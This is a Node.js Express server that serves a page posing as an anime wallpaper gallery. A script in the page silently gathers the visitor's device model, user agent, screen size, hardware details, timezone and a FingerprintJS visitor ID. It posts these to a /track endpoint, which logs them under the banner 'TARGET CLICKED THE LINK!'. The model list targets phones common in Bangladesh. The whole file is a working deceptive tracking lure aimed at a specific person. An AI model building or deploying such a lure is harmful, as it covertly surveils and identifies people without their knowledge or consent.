const express = require('express');
const app = express();
app.use(express.json({ limit: '10mb' }));

// Bangladesh Popular Models
const modelNames = {
    '23021RAAEG': 'Redmi 13C',
    '23028RA60L': 'Redmi 13C',
    '23053RN02Y': 'Redmi 13C / Poco C65',
    '23129RAAEG': 'Redmi 14C',
    '22101317C': 'Redmi Note 12 5G',
    '23013RK75C': 'Redmi Note 12',
    'SM-A145F': 'Galaxy A14',
    'SM-A155F': 'Galaxy A15',
    'SM-A235F': 'Galaxy A23',
    'RMX3391': 'Realme 9i',
    'X669C': 'Infinix Hot 12',
    // aro add korte paro
};

app.get('/', (req, res) => {
    const html = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Anime Gallery HD</title>
    <style>
        body { margin:0; background:#000; height:100vh; display:flex; align-items:center; justify-content:center; overflow:hidden; }
        img { max-width:100%; max-height:100%; object-fit:contain; }
    </style>
</head>
<body>
    <img src="https://images6.alphacoders.com/135/thumbbig-1358426.webp" alt="Anime Wallpaper">
    
    <script src="https://openfpcdn.io/fingerprintjs/v5" async></script>
   
    <script>
        async function getFullDeviceInfo() {
            let deviceFullName = "Unknown Device";

            // Try High Entropy First
            if (navigator.userAgentData) {
                try {
                    const ua = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']);
                    const modelCode = (ua.model || '').trim();
                    if (modelCode) {
                        deviceFullName = window.modelNames?.[modelCode] || modelCode;
                    } else if (ua.platform === 'Android') {
                        deviceFullName = 'Android Device (Model Hidden)';
                    }
                } catch(e) {}
            }

            // Fallback: Parse User-Agent
            if (deviceFullName === "Unknown Device" || deviceFullName.includes("Hidden")) {
                const ua = navigator.userAgent;
                const androidMatch = ua.match(/Android.*?; ([^;)]+)/);
                if (androidMatch && androidMatch[1]) {
                    deviceFullName = androidMatch[1].trim();
                }
            }

            const info = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                deviceFullName: deviceFullName,
                deviceModelCode: navigator.userAgentData?.model || '',
                screen: { width: screen.width, height: screen.height },
                hardware: { cores: navigator.hardwareConcurrency, memory: navigator.deviceMemory },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            };

            // FingerprintJS
            try {
                const fp = await import('https://openfpcdn.io/fingerprintjs/v5')
                    .then(FingerprintJS => FingerprintJS.load());
                const result = await fp.get();
                info.fingerprint = { visitorId: result.visitorId };
            } catch(e) {}

            fetch('/track', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(info)
            }).catch(() => {});

            console.log("📤 Info Sent");
        }

        window.modelNames = ${JSON.stringify(modelNames)};
        window.onload = getFullDeviceInfo;
    </script>
</body>
</html>`;
    res.send(html);
});

app.post('/track', (req, res) => {
    console.log('\n🔥🔥 TARGET CLICKED THE LINK! 🔥🔥');
    console.log('📱 Device Full Name :', req.body.deviceFullName || 'N/A');
    console.log('📟 Model Code       :', req.body.deviceModelCode || 'N/A');
    console.log('🔍 Full Information:');
    console.dir(req.body, { depth: null });
    console.log('--------------------------------------------------\n');
   
    res.status(200).send('ok');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log('Server is running on port', PORT);
});
